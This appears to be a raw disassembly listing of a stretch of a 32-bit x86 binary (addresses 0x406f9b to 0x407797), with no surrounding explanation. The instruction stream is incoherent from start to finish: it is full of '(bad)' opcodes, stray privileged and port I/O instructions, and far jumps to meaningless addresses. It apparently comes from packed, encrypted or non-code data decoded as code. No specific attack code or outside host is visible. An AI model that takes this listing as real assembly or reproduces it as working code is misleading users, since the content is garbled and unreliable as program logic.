  406f9b:	mov    edx,0x2649279f
  406fa0:	mov    al,ds:0xcdef1913
  406fa5:	mov    cs,WORD PTR [esi-0x37]
  406fa8:	sbb    eax,0x4affc4bb
  406fad:	sbb    eax,0xcdecff35
  406fb2:	fcmovnbe st,st(4)
  406fb4:	(bad)  
  406fb5:	into   
  406fb6:	push   cs
  406fb7:	add    DWORD PTR [ebx-0x11],esp
  406fba:	in     eax,0xf4
  406fbc:	lods   eax,DWORD PTR ds:[esi]
  406fbd:	call   0xfda4:0x23d5385b
  406fc4:	and    BYTE PTR [edx],cl
  406fc6:	in     eax,dx
  406fc7:	test   BYTE PTR [ebx+0x29],bl
  406fca:	lea    ecx,[edx]
  406fcc:	jae    0x406ff9
  406fce:	imul   ebx,DWORD PTR [edi],0xffffffe0
  406fd1:	xchg   ebp,eax
  406fd2:	jo     0x406fba
  406fd4:	hlt    
  406fd5:	pusha  
  406fd6:	push   edi
  406fd7:	data16 xchg BYTE PTR [edx],bl
  406fda:	enter  0x1336,0xfb
  406fde:	sub    bh,BYTE PTR [ecx]
  406fe0:	ds dec eax
  406fe2:	push   edx
  406fe3:	hlt    
  406fe4:	mov    cl,0xb2
  406fe6:	add    BYTE PTR [esi+edx*4+0x70e0ad80],ch
  406fed:	push   cs
  406fee:	push   ds
  406fef:	loope  0x40700f
  406ff1:	adc    DWORD PTR [edi],esp
  406ff3:	ds loop 0x406fa1
  406ff6:	pop    esi
  406ff7:	shl    BYTE PTR [esi],cl
  406ff9:	jp     0x406fc6
  406ffb:	pushf  
  406ffc:	jmp    0xe5c0159b
  407001:	mov    al,ds:0xd72f7b02
  407006:	fld    DWORD PTR [ecx+0x185dfb21]
  40700c:	jmp    0x407002
  40700e:	aad    0xaf
  407010:	pushf  
  407011:	rcl    DWORD PTR [ebp-0x7b],1
  407014:	cmc    
  407015:	(bad)  
  407016:	lea    ecx,[ebx+0x66]
  407019:	(bad)  
  40701a:	xchg   edi,eax
  40701b:	stos   BYTE PTR es:[edi],al
  40701c:	push   ebx
  40701d:	adc    al,0x2f
  40701f:	sbb    DWORD PTR [edi+ecx*4-0xe],edi
  407023:	lods   eax,DWORD PTR ds:[esi]
  407024:	sahf   
  407025:	ds out 0x69,eax
  407028:	aad    0xb
  40702a:	ret    
  40702b:	(bad)  [ebp+0x10]
  40702e:	jle    0x4070af
  407030:	sub    BYTE PTR ds:0xad45940c,bh
  407036:	mov    al,0x74
  407038:	mov    ch,0xcd
  40703a:	mov    cl,0x18
  40703c:	cmp    esi,DWORD PTR [esi-0x17]
  40703f:	jp     0x40709b
  407041:	jno    0x407088
  407043:	jns    0x4070a4
  407045:	cmp    al,0xf2
  407047:	sbb    dh,ch
  407049:	mov    ch,0x9c
  40704b:	(bad)  
  40704c:	cwde   
  40704d:	es popf 
  40704f:	sbb    DWORD PTR [ebx-0x7c242efc],ebp
  407055:	sbb    edi,DWORD PTR [esi]
  407057:	xchg   esp,eax
  407058:	xor    DWORD PTR [edx-0x45],0x1e
  40705c:	mov    edx,0x918ab612
  407061:	pop    ds
  407062:	fidivr DWORD PTR [ebp+0x15dde0aa]
  407068:	gs jecxz 0x40709f
  40706b:	test   DWORD PTR [ecx+0x4e40a5ea],esp
  407071:	inc    esi
  407072:	xor    BYTE PTR [esi+eiz*8],cl
  407075:	inc    edi
  407076:	imul   esp,DWORD PTR [esi],0x8c9de911
  40707c:	sub    BYTE PTR [edi+0x563affd2],0xf2
  407083:	or     al,0xa0
  407085:	pop    es
  407086:	and    al,0xd
  407088:	jp     0x407072
  40708a:	or     eax,0x2bf89d8f
  40708f:	test   al,0x23
  407091:	or     al,0x84
  407093:	jg     0x407018
  407095:	cli    
  407096:	leave  
  407097:	arpl   cx,cx
  407099:	pop    ebx
  40709a:	pop    ss
  40709b:	clc    
  40709c:	hlt    
  40709d:	sbb    eax,0x381dbd32
  4070a2:	add    esp,edi
  4070a4:	aas    
  4070a5:	jns    0x407035
  4070a7:	push   0xb
  4070a9:	loopne 0x40703e
  4070ab:	inc    ebp
  4070ac:	push   eax
  4070ad:	mov    ecx,0xbc0e0945
  4070b2:	(bad)  
  4070b3:	out    0xd2,eax
  4070b5:	neg    DWORD PTR [esi+eiz*4]
  4070b8:	sbb    dh,bh
  4070ba:	add    BYTE PTR [edi],bl
  4070bc:	dec    ebx
  4070bd:	or     cl,BYTE PTR [ecx+0xca0481d]
  4070c3:	mov    dh,0x15
  4070c5:	xor    edx,DWORD PTR [ebp-0x29f4e087]
  4070cb:	or     DWORD PTR [ecx-0x3ce4882],ebp
  4070d1:	shl    DWORD PTR [esi],cl
  4070d3:	outs   dx,DWORD PTR ds:[esi]
  4070d4:	ja     0x4070d3
  4070d6:	lea    eax,es:[eax]
  4070d9:	add    ebp,edx
  4070db:	add    DWORD PTR [edi-0x16598f7c],ebx
  4070e1:	mov    DWORD PTR [ebx],esi
  4070e3:	jns    0x40715a
  4070e5:	(bad)  
  4070e6:	inc    edx
  4070e7:	xor    al,al
  4070e9:	mov    ah,0xa
  4070eb:	add    al,0xae
  4070ed:	pushw  es
  4070ef:	mov    cl,0xd6
  4070f1:	dec    esp
  4070f2:	push   ebx
  4070f3:	and    BYTE PTR [edx+eax*4-0x5527556c],cl
  4070fa:	sbb    BYTE PTR [edx-0x10],0x9e
  4070fe:	adc    eax,0xbdbc2144
  407103:	jb     0x40714b
  407105:	or     BYTE PTR [edi],bl
  407107:	xchg   DWORD PTR [esi],eax
  407109:	and    eax,0x388483d6
  40710e:	sub    edi,ebx
  407110:	sub    DWORD PTR [eax-0xc],esi
  407113:	arpl   WORD PTR [esi+0x14],di
  407116:	fistp  DWORD PTR [eax+0x3291c7ec]
  40711c:	xchg   ecx,eax
  40711d:	enter  0x4c86,0xa5
  407121:	(bad)  
  407122:	push   ss
  407123:	ins    DWORD PTR es:[edi],dx
  407124:	add    BYTE PTR [ebx+0x1296479b],cl
  40712a:	cmc    
  40712b:	retf   0x4cff
  40712e:	rcr    DWORD PTR [ecx],0x1c
  407131:	mov    dl,0x76
  407133:	sub    al,cl
  407135:	out    0x88,eax
  407137:	fadd   st,st(1)
  407139:	inc    ebp
  40713a:	stos   BYTE PTR es:[edi],al
  40713b:	dec    ebx
  40713c:	inc    edx
  40713d:	cld    
  40713e:	add    eax,0x65f80440
  407143:	xor    ebx,ebp
  407145:	stc    
  407146:	fist   DWORD PTR [edx+0x6a]
  407149:	scas   eax,DWORD PTR es:[edi]
  40714a:	ss rcr ebp,cl
  40714d:	jo     0x407106
  40714f:	outs   dx,DWORD PTR ds:[esi]
  407150:	jl     0x407190
  407152:	or     dh,cl
  407154:	lea    ebp,[edx]
  407156:	int3   
  407157:	mov    dl,bh
  407159:	cmp    eax,0x61eba2bc
  40715e:	cmp    ebp,DWORD PTR [eax-0x4c518a9c]
  407164:	iret   
  407165:	lfs    ecx,FWORD PTR [ebx+0x58]
  407169:	adc    ebp,DWORD PTR [edi]
  40716b:	scas   eax,DWORD PTR es:[edi]
  40716c:	sbb    al,BYTE PTR [ebp-0x34a91610]
  407172:	arpl   WORD PTR [esi-0x1e8cc33a],bp
  407178:	cli    
  407179:	mov    fs,edi
  40717b:	push   0x3c46704d
  407180:	xchg   DWORD PTR [edi-0x5b],ecx
  407183:	cmp    eax,0xe3d4a1de
  407188:	dec    eax
  407189:	jns    0x4071c7
  40718b:	fdiv   QWORD PTR [ebx+0x6c6faf6]
  407191:	rcl    BYTE PTR [edi+0xdb9c18c],0x4a
  407198:	fistp  WORD PTR [edi-0x44]
  40719b:	sbb    DWORD PTR [edx-0x3a],edx
  40719e:	push   esp
  40719f:	mov    cl,0x28
  4071a1:	mov    bl,ch
  4071a3:	(bad)  
  4071a4:	jns    0x40712f
  4071a6:	push   0x45f26225
  4071ab:	inc    ecx
  4071ac:	pop    esi
  4071ad:	loopne 0x4071cf
  4071af:	lea    ebx,[ebp+ebx*1-0x204eeeaa]
  4071b6:	cmp    esp,DWORD PTR [esi+0x493db00]
  4071bc:	and    BYTE PTR ds:0xe6495582,dh
  4071c2:	(bad)  
  4071c3:	jb     0x4071bc
  4071c5:	mov    edi,0x60408e06
  4071ca:	into   
  4071cb:	jge    0x4071bf
  4071cd:	or     BYTE PTR [ecx],ch
  4071cf:	mov    dl,ah
  4071d1:	inc    ebp
  4071d2:	icebp  
  4071d3:	mov    ds:0x242d5d32,al
  4071d8:	xchg   esi,ebp
  4071da:	in     eax,dx
  4071db:	cmp    eax,0x25612c55
  4071e0:	xor    edi,0xdf7622a4
  4071e6:	xchg   BYTE PTR [ebp+0x26],al
  4071e9:	les    ebx,FWORD PTR [ecx+0x66]
  4071ec:	stc    
  4071ed:	lock or BYTE PTR [edi],bh
  4071f0:	mov    eax,0xcd73425
  4071f5:	(bad)
  4071f8:	sar    DWORD PTR [ecx],1
  4071fa:	fild   WORD PTR [edi-0x42fb311e]
  407200:	mov    cl,0xf4
  407202:	cmp    eax,0x276bdb28
  407207:	daa    
  407208:	retf   
  407209:	stos   BYTE PTR es:[edi],al
  40720a:	cwde   
  40720b:	sbb    BYTE PTR [esi+0x2ed961a5],0x89
  407212:	jb     0x4071ba
  407214:	push   cs
  407215:	add    dl,BYTE PTR [ebx]
  407217:	int    0x82
  407219:	mov    dh,0x44
  40721b:	mov    ?,WORD PTR [ebx-0x46a0414]
  407221:	or     DWORD PTR [edx-0x48],esp
  407224:	sbb    eax,0xbd83f169
  407229:	push   es
  40722a:	ins    BYTE PTR es:[edi],dx
  40722b:	mov    edx,0x910c159
  407230:	xor    eax,0x9145ab97
  407235:	xchg   edx,eax
  407236:	psrlw  mm4,QWORD PTR [edi]
  407239:	hlt    
  40723a:	jle    0x40722c
  40723c:	mov    ds:0x18df35e5,eax
  407241:	out    0xe1,al
  407243:	or     BYTE PTR [ebx],ch
  407245:	fsubr  DWORD PTR [esi+0x2b]
  407248:	jecxz  0x407213
  40724a:	xor    esp,DWORD PTR [eax]
  40724c:	sysenter 
  40724e:	dec    edi
  40724f:	pop    ds
  407250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407251:	push   ecx
  407252:	sub    cl,ah
  407254:	adc    eax,0x3286c904
  407259:	sbb    dl,BYTE PTR [esp+eax*2]
  40725c:	add    eax,0x24ef17a7
  407261:	dec    esp
  407262:	pop    esp
  407263:	or     DWORD PTR [edi-0x68],esi
  407266:	adc    DWORD PTR [ebx],ebp
  407268:	cmp    DWORD PTR [edx-0x6f],esi
  40726b:	out    0x35,eax
  40726d:	loop   0x407212
  40726f:	sti    
  407270:	jnp    0x4072ae
  407272:	sub    eax,0xce61b090
  407277:	ins    BYTE PTR es:[edi],dx
  407278:	es cmc 
  40727a:	jb     0x4072c6
  40727c:	add    bl,BYTE PTR [ecx]
  40727e:	and    DWORD PTR [ebx+0x320719b0],esp
  407284:	popa   
  407285:	ss push ebp
  407287:	and    edi,DWORD PTR ss:[ebx]
  40728a:	xchg   esp,eax
  40728b:	add    BYTE PTR [ecx],bh
  40728d:	shl    DWORD PTR [edi],cl
  40728f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407290:	shl    DWORD PTR [esi*1+0x263717ec],1
  407297:	mov    edx,0xd1db8c7e
  40729c:	dec    ebp
  40729d:	(bad)  
  40729e:	repz out dx,al
  4072a0:	loop   0x407297
  4072a2:	lock mov al,0x2b
  4072a5:	cmp    esi,edi
  4072a7:	and    ch,BYTE PTR [ebp+edx*2+0x5a]
  4072ab:	adc    DWORD PTR [esi+ebx*1],esi
  4072ae:	mov    bh,0xbb
  4072b0:	adc    DWORD PTR ds:[eax+0x4b],0x63f9fc31
  4072b8:	adc    DWORD PTR [ebx],eax
  4072ba:	outs   dx,DWORD PTR ds:[esi]
  4072bb:	aad    0x54
  4072bd:	or     eax,0xd36804c8
  4072c2:	ret    0x3393
  4072c5:	js     0x4072ec
  4072c7:	fld    QWORD PTR [edx-0x6c78af9c]
  4072cd:	mov    dl,0xcd
  4072cf:	xchg   ecx,eax
  4072d1:	(bad)  
  4072d2:	imul   ch
  4072d4:	imul   BYTE PTR [ebx+0x6f89c90]
  4072da:	inc    esi
  4072db:	mov    esi,DWORD PTR [ecx+edi*2]
  4072de:	dec    edx
  4072df:	jbe    0x407324
  4072e1:	pop    ss
  4072e2:	mov    eax,0x70b1d693
  4072e7:	xor    eax,0xe48a71f
  4072ec:	jbe    0x4072ca
  4072ee:	(bad)  
  4072ef:	push   edi
  4072f0:	mov    cs,WORD PTR [esi]
  4072f2:	and    eax,esi
  4072f4:	mov    ah,0xb7
  4072f6:	in     eax,dx
  4072f7:	lods   al,BYTE PTR ds:[esi]
  4072f8:	xchg   BYTE PTR [eax-0x28175cb0],al
  4072fe:	ins    DWORD PTR es:[edi],dx
  4072ff:	cmp    esi,DWORD PTR [ebx-0x61d1adfb]
  407305:	dec    ebp
  407306:	call   0xdf60:0x4a854f3
  40730d:	call   0x9a63b056
  407312:	mov    eax,ebx
  407314:	retf   
  407315:	fsub   DWORD PTR [edi-0x41606405]
  40731b:	pop    edx
  40731c:	jmp    0x40730a
  40731e:	sbb    ch,BYTE PTR [ebx]
  407320:	mov    DWORD PTR [ecx-0x58],eax
  407323:	test   BYTE PTR [eax+esi*2+0x3bded884],dl
  40732a:	std    
  40732b:	mov    DWORD PTR [edx+0x76],ecx
  40732e:	sbb    dh,BYTE PTR ss:[edi+0x3f1b05f6]
  407335:	lods   eax,DWORD PTR ds:[esi]
  407336:	inc    ebp
  407337:	call   0x8345f97e
  40733c:	xor    DWORD PTR [ecx],0x5
  40733f:	jo     0x407348
  407341:	inc    ecx
  407342:	in     eax,0xf0
  407344:	add    BYTE PTR [edx],0xf5
  407347:	jmp    0xed43:0x1a98e45f
  40734e:	outs   dx,DWORD PTR ds:[esi]
  40734f:	add    esi,ebx
  407351:	imul   esi,DWORD PTR [ebp-0x62],0x13
  407355:	sub    eax,0xb8b32aca
  40735a:	or     eax,0x65be84f5
  40735f:	or     al,0x3a
  407361:	les    esp,FWORD PTR [ecx-0x44]
  407364:	test   BYTE PTR [esi-0x2c],0x13
  407368:	repnz fldenv ds:0x4eae5039
  40736f:	(bad)  
  407370:	inc    eax
  407371:	add    DWORD PTR [ebx],eax
  407373:	fwait
  407374:	pop    ecx
  407375:	xchg   BYTE PTR [edi+0x6d],cl
  407378:	mov    al,ds:0x6da78b34
  40737d:	fist   DWORD PTR [edx-0x3d3c5f8f]
  407383:	sub    DWORD PTR [ecx],0x7682d8bf
  407389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40738a:	or     eax,0x6c9200ff
  40738f:	int    0x7a
  407391:	lods   al,BYTE PTR ds:[esi]
  407392:	ins    BYTE PTR es:[edi],dx
  407393:	cmp    ecx,eax
  407395:	leave  
  407396:	mov    ebp,0xd2fb6158
  40739b:	gs pusha 
  40739d:	pop    ds
  40739e:	je     0x407328
  4073a0:	out    0xfb,eax
  4073a2:	sbb    eax,DWORD PTR [ecx]
  4073a4:	jne    0x407362
  4073a6:	rcl    BYTE PTR [esi-0x34],cl
  4073a9:	aad    0xeb
  4073ab:	jmp    0x418a:0x6bb5eb21
  4073b2:	retf   
  4073b3:	mov    edi,0x2085f455
  4073b8:	mov    al,ds:0xcfc0a8d7
  4073bd:	add    al,0xb5
  4073bf:	or     BYTE PTR [esi],bh
  4073c1:	mov    al,ds:0xb44ca23c
  4073c6:	test   DWORD PTR [eax-0x1f2d802a],ecx
  4073cc:	xor    al,0xcd
  4073ce:	fwait
  4073cf:	cmp    eax,0x980b8725
  4073d4:	jnp    0x4073f4
  4073d6:	adc    bh,BYTE PTR [eax-0x4b]
  4073d9:	fadd   st(6),st
  4073db:	jns    0x4073a6
  4073dd:	mov    bh,0x96
  4073df:	fild   QWORD PTR [eax]
  4073e1:	push   edi
  4073e2:	xchg   ebx,eax
  4073e3:	aaa    
  4073e4:	cmp    eax,0x26bbaef7
  4073e9:	shr    DWORD PTR [esi-0x1f],1
  4073ec:	ds out 0x9,al
  4073ef:	mov    ds:0x1ea6018a,eax
  4073f4:	fwait
  4073f5:	cdq    
  4073f6:	adc    dh,dh
  4073f8:	aas    
  4073f9:	add    DWORD PTR [ecx+eiz*1-0x1464cd19],edi
  407400:	shr    BYTE PTR [ecx+edx*8+0x70],1
  407404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407405:	bound  ebp,QWORD PTR [ecx]
  407407:	(bad)  
  407408:	adc    eax,0x207d5fe
  40740d:	(bad)  
  40740e:	addr16 fwait
  407410:	xor    esi,eax
  407412:	sahf   
  407413:	add    al,0xf
  407415:	push   cs
  407416:	mov    eax,0x390a629f
  40741b:	fistp  WORD PTR [edi-0x3e73c522]
  407421:	adc    DWORD PTR ds:0x74a37b95,ebp
  407427:	outs   dx,BYTE PTR ds:[esi]
  407428:	mov    al,ds:0x91f98f9a
  40742d:	nop
  40742e:	fcmovbe st,st(6)
  407430:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407432:	stos   DWORD PTR es:[edi],eax
  407433:	mov    ebx,0xf6f79a4b
  407438:	iret   
  407439:	dec    edx
  40743a:	add    BYTE PTR [esi],bh
  40743c:	xchg   edx,eax
  40743d:	nop
  40743e:	ins    BYTE PTR es:[edi],dx
  40743f:	lahf   
  407440:	mov    bl,0x88
  407442:	mov    edi,0xa29d0273
  407447:	fcomi  st,st(3)
  407449:	imul   ecx,DWORD PTR [ecx],0x445ef59c
  40744f:	sbb    eax,ecx
  407451:	or     DWORD PTR es:[esi+0x44],ebp
  407455:	popa   
  407456:	iret   
  407457:	xchg   edi,eax
  407458:	shl    DWORD PTR [esi],1
  40745a:	mov    cl,0x35
  40745c:	push   edi
  40745d:	test   eax,0x7bb496d
  407462:	ss cli 
  407464:	pop    edi
  407465:	jb     0x407461
  407467:	retf   0xc30d
  40746a:	punpckhwd mm7,QWORD PTR [ecx+0x13]
  40746e:	jnp    0x4074ed
  407470:	stc    
  407471:	in     eax,dx
  407472:	push   ecx
  407473:	add    al,0x80
  407475:	or     DWORD PTR [eax+0x72],0xb6301839
  40747c:	mov    gs,WORD PTR [ecx-0x20]
  40747f:	adc    al,0x8e
  407481:	lock dec ebp
  407484:	cld    
  407485:	jno    0x4074cb
  407487:	ja     0x4074a0
  407489:	je     0x4074ea
  40748b:	push   eax
  40748c:	jp     0x407451
  40748e:	fsub   st(0),st
  407490:	jae    0x40748f
  407492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407493:	sub    BYTE PTR [eax],dl
  407495:	mov    bl,0xd0
  407497:	jmp    0x4074d6
  407499:	mov    al,ds:0x84a60c1b
  40749e:	adc    al,0xb0
  4074a0:	lods   eax,DWORD PTR ds:[esi]
  4074a1:	sub    ebx,DWORD PTR [edx+ebx*4+0x6a]
  4074a5:	mov    ds:0x5ab7b598,eax
  4074aa:	in     al,0x24
  4074ac:	jl     0x4074e1
  4074ae:	pop    edi
  4074af:	mov    bl,ah
  4074b1:	jbe    0x4074c5
  4074b3:	add    cl,BYTE PTR [esi-0x6338414c]
  4074b9:	sub    bl,BYTE PTR [edx+0x34afde2d]
  4074bf:	rcl    BYTE PTR ds:0x5f55ac86,1
  4074c5:	loop   0x4074b6
  4074c7:	or     BYTE PTR [esi+0x2022e92a],0x4e
  4074ce:	fistp  WORD PTR [ecx-0x25d1ca]
  4074d4:	and    eax,0x6dd5a2d7
  4074d9:	lahf   
  4074da:	int    0xa3
  4074dc:	fcmovnb st,st(7)
  4074de:	and    DWORD PTR [ebx-0x2501a251],ebp
  4074e4:	mov    ch,0x5f
  4074e6:	push   es
  4074e7:	int3   
  4074e8:	pop    edx
  4074e9:	dec    esi
  4074ea:	dec    ecx
  4074eb:	jmp    0xf8bafda3
  4074f0:	jae    0x40751c
  4074f2:	fnstcw WORD PTR [edx-0x15ee0fbf]
  4074f8:	int3   
  4074f9:	pop    ds
  4074fa:	mov    DWORD PTR ds:0x683fccdd,edx
  407500:	xchg   bh,bh
  407502:	push   edx
  407503:	test   ebp,0xae737e8c
  407509:	dec    edx
  40750a:	out    0x5c,al
  40750c:	test   DWORD PTR [eax+eiz*4],ecx
  40750f:	inc    esi
  407510:	mov    eax,ds:0x8ff8dfe
  407515:	into   
  407516:	into   
  407517:	pop    ebx
  407518:	stos   DWORD PTR es:[edi],eax
  407519:	setbe  ch
  40751c:	adc    al,0xa0
  40751e:	fisttp WORD PTR [ecx-0xa95c720]
  407524:	cmp    BYTE PTR [ebp+0x32],dh
  407527:	or     BYTE PTR [edx],cl
  407529:	ror    BYTE PTR [ebp-0x3],cl
  40752c:	jl     0x4074af
  40752e:	mov    edx,0x7dadc2bb
  407533:	mov    ebp,0xeae22990
  407538:	adc    eax,DWORD PTR [edi-0x38]
  40753b:	sbb    eax,DWORD PTR [ecx-0x7]
  40753e:	dec    edi
  40753f:	adc    edx,0x30bacb9e
  407545:	fiadd  DWORD PTR [esp+ecx*8-0x2e]
  407549:	jne    0x4075a1
  40754b:	dec    ebp
  40754c:	aam    0x31
  40754e:	pop    ds
  40754f:	pop    ss
  407550:	push   eax
  407551:	mov    esp,0xb2f44f30
  407556:	inc    eax
  407557:	int3   
  407558:	shr    bl,cl
  40755a:	in     eax,0xbb
  40755c:	mov    ds:0x1bafcbef,eax
  407561:	out    0x5b,al
  407563:	or     esi,DWORD PTR [ebx-0xa4865d4]
  407569:	(bad)  
  40756a:	out    0xe,al
  40756c:	inc    eax
  40756d:	lea    ecx,[ecx]
  40756f:	and    eax,0x54ff266f
  407574:	ins    BYTE PTR es:[edi],dx
  407575:	xchg   edx,eax
  407576:	jno    0x407519
  407578:	add    eax,0x71238f66
  40757d:	push   ss
  40757e:	push   edx
  40757f:	pop    ebp
  407580:	sub    ebx,esp
  407582:	icebp  
  407583:	in     eax,0x90
  407585:	aas    
  407586:	ret    
  407587:	scas   eax,DWORD PTR es:[edi]
  407588:	and    ah,cl
  40758a:	xlat   BYTE PTR ds:[ebx]
  40758b:	pop    eax
  40758c:	sbb    edx,DWORD PTR [ebp-0x1eb88c6d]
  407592:	jb     0x407599
  407594:	jle    0x40759a
  407596:	cwde   
  407597:	frstor [edi]
  407599:	in     eax,dx
  40759a:	sub    al,0x29
  40759c:	sahf   
  40759d:	ds dec ecx
  40759f:	out    dx,al
  4075a0:	sub    DWORD PTR [esi],0x26b102a6
  4075a6:	sbb    ebx,esp
  4075a8:	sbb    dl,BYTE PTR [ecx+0x36]
  4075ab:	stos   BYTE PTR es:[edi],al
  4075ac:	imul   esi,DWORD PTR [edi+edx*4+0x5191b1e],0x3ce5e54c
  4075b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b8:	ss icebp 
  4075ba:	call   0x5eee:0x8680eef1
  4075c1:	add    DWORD PTR [ebp-0x56cac771],edx
  4075c7:	in     eax,0x27
  4075c9:	mov    es,WORD PTR [ebx]
  4075cb:	dec    edi
  4075cc:	add    al,0x38
  4075ce:	test   DWORD PTR [ebx-0x42080c00],ecx
  4075d4:	xchg   DWORD PTR [ecx-0x6e],esp
  4075d7:	mov    edi,0x878d0613
  4075dc:	and    eax,0x846277ea
  4075e1:	sub    DWORD PTR [edi+0x17],ecx
  4075e4:	xor    al,0x21
  4075e6:	add    cl,BYTE PTR [eax+0x5fdf6f5f]
  4075ec:	xchg   esp,eax
  4075ed:	jne    0x407583
  4075ef:	xchg   BYTE PTR [ebx],bh
  4075f1:	(bad)
  4075f4:	es pop es
  4075f6:	cmp    DWORD PTR [edi+0xd],esi
  4075f9:	push   ebx
  4075fa:	xor    eax,0xc3624d65
  4075ff:	out    dx,al
  407600:	ins    BYTE PTR es:[edi],dx
  407601:	dec    esp
  407602:	pop    ebp
  407603:	pop    ecx
  407604:	and    al,0x21
  407606:	popa   
  407607:	test   DWORD PTR [edi-0x5a],esi
  40760a:	retf   0xc29
  40760d:	sahf   
  40760e:	and    BYTE PTR [ecx+0x13ef1a40],bl
  407614:	mov    ecx,0x1437015e
  407619:	(bad)  
  40761a:	aas    
  40761b:	xchg   ebp,eax
  40761c:	pop    ds
  40761d:	xchg   ebx,eax
  40761e:	and    DWORD PTR [edi+0x746724ca],eax
  407624:	jb     0x40769d
  407626:	cdq    
  407627:	xor    eax,0x1ab2ea11
  40762c:	jg     0x4075f4
  40762e:	(bad)  
  40762f:	xchg   ebp,eax
  407630:	push   ebx
  407631:	inc    DWORD PTR [ebx]
  407633:	pop    ebp
  407634:	xchg   edi,eax
  407635:	data16 xor ch,BYTE PTR [edi-0x21c6e7c9]
  40763c:	and    DWORD PTR [ebp-0x1a84426a],0xffffffff
  407643:	push   ebp
  407644:	clc    
  407645:	mov    ebp,0x1be456e9
  40764a:	mov    ch,0x29
  40764c:	daa    
  40764d:	adc    eax,0x150a9907
  407652:	dec    ebp
  407653:	mov    edx,0xda84c9bb
  407658:	jmp    0x867f:0x4733bab4
  40765f:	xlat   BYTE PTR ds:[ebx]
  407660:	xchg   esp,eax
  407661:	repnz fsub st(2),st
  407664:	adc    BYTE PTR [ecx-0x5c],ch
  407667:	mov    al,0xd4
  407669:	mov    al,ds:0xf2c7e02
  40766e:	ins    BYTE PTR es:[edi],dx
  40766f:	gs cdq 
  407671:	push   0xf0b875d5
  407676:	xchg   ecx,eax
  407677:	xchg   ecx,eax
  407678:	lahf   
  407679:	loope  0x407610
  40767b:	dec    ebp
  40767c:	pop    esi
  40767d:	push   es
  40767e:	jmp    0x6c14:0x81d5f77d
  407685:	sub    edi,ebx
  407687:	sub    DWORD PTR [ecx+0x2d],eax
  40768a:	pushf  
  40768b:	lock (bad) 
  40768e:	push   ecx
  40768f:	cmp    bl,BYTE PTR [esi+0x60]
  407692:	dec    ebp
  407693:	jge    0x4076af
  407695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407696:	mov    ds:0xab87d1f3,eax
  40769b:	lods   al,BYTE PTR ds:[esi]
  40769c:	jb     0x4076c1
  40769e:	ins    BYTE PTR es:[edi],dx
  40769f:	push   0x7c
  4076a1:	pop    eax
  4076a2:	and    al,0xd9
  4076a4:	fs pusha 
  4076a6:	mov    ebp,0x17ad5c01
  4076ab:	pop    edi
  4076ac:	les    edi,FWORD PTR gs:[eax-0x55]
  4076b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076b1:	jge    0x407645
  4076b3:	jo     0x407638
  4076b5:	ins    BYTE PTR es:[edi],dx
  4076b6:	(bad)  [ebp-0x5ee144f2]
  4076bc:	mov    ds:0xc9c16c0,eax
  4076c1:	push   ebp
  4076c2:	and    BYTE PTR [ecx+eax*2],0x1e
  4076c6:	jmp    DWORD PTR [edx]
  4076c8:	adc    al,0x94
  4076ca:	xlat   BYTE PTR ds:[ebx]
  4076cb:	lods   al,BYTE PTR ds:[esi]
  4076cc:	lods   eax,DWORD PTR ds:[esi]
  4076cd:	dec    ebx
  4076ce:	inc    edx
  4076cf:	popa   
  4076d0:	ret    0x121f
  4076d3:	clc    
  4076d4:	mov    edi,edi
  4076d6:	loopne 0x4076ac
  4076d8:	sbb    DWORD PTR [ebp+0x26],0xf1c05730
  4076df:	sbb    al,0x44
  4076e1:	jbe    0x407673
  4076e3:	jmp    0x4076dd
  4076e5:	xchg   ebx,eax
  4076e6:	push   ebx
  4076e7:	jl     0x407734
  4076e9:	pushf  
  4076ea:	inc    edx
  4076eb:	mov    bl,0x64
  4076ed:	cmp    DWORD PTR ds:0xf77538ca,esi
  4076f3:	fld    DWORD PTR [ebx+ecx*1]
  4076f6:	lock jl 0x407768
  4076f9:	repnz and ecx,DWORD PTR [eax]
  4076fc:	sti    
  4076fd:	inc    eax
  4076fe:	in     eax,dx
  4076ff:	stos   BYTE PTR es:[edi],al
  407700:	and    eax,0x4b34bf1f
  407705:	mov    ebx,0x93f4fa9c
  40770a:	inc    edi
  40770b:	sbb    al,0xd2
  40770d:	mov    ebx,0x40f46537
  407712:	adc    BYTE PTR [ebx+0x4bb0f06a],dh
  407718:	mov    bl,0x7e
  40771a:	add    cl,BYTE PTR [edi]
  40771c:	shl    cl,1
  40771e:	in     eax,0xa7
  407720:	in     ax,0x36
  407723:	ss add al,0xbe
  407726:	aam    0xb4
  407728:	add    eax,0x9867a285
  40772d:	pop    edx
  40772e:	mov    ds:0x97aebe6e,eax
  407733:	scas   al,BYTE PTR es:[edi]
  407734:	test   DWORD PTR [ebp-0x895360f],esp
  40773a:	pop    edi
  40773b:	inc    ebx
  40773c:	dec    esi
  40773d:	test   BYTE PTR [ecx+0x4d],bl
  407740:	add    ecx,DWORD PTR [esi-0x1955220f]
  407746:	sbb    ch,BYTE PTR [esi+eax*4-0x7f82d82]
  40774d:	les    esi,FWORD PTR [ebp-0x78216d91]
  407753:	push   ss
  407754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407755:	mov    WORD PTR [esi+eax*4+0x7fbd7c8e],fs
  40775c:	jns    0x4077d2
  40775e:	in     eax,dx
  40775f:	or     ebx,DWORD PTR [ebx]
  407761:	adc    DWORD PTR [edi+0x66],ebp
  407764:	nop
  407765:	xchg   cl,cl
  407767:	sub    edi,DWORD PTR [ebp+eax*8-0x51547828]
  40776e:	cmp    dl,BYTE PTR [edx-0x7f1af445]
  407774:	xor    esp,DWORD PTR [ebx+0x36158334]
  40777a:	mov    al,0x56
  40777c:	dec    edx
  40777d:	arpl   WORD PTR [ebx+0x39],ax
  407780:	jmp    0x407784
  407782:	adc    dh,BYTE PTR [ecx]
  407784:	fwait
  407785:	jp     0x407756
  407787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407788:	loopne 0x407710
  40778a:	cs sub eax,0x1063acc9
  407790:	sbb    edx,esp
  407792:	or     DWORD PTR [ebx+ecx*4],ecx
  407795:	(bad)  
  407796:	sahf   
  407797:	aad    0xba
